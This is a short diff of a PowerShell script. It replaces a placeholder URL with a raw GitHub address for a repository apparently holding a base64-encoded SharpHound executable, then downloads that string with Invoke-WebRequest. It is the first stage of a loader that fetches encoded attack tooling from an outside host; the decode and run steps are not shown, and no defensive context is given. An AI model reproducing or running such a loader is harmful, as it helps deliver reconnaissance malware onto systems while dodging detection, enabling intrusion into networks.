@@ -1,5 +1,5 @@
 # Define the URL containing the base64 encoded string
-$url = "http://example.com/base64encodedexe"
+$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"
 
 # Download the base64 encoded string from the URL
 $base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
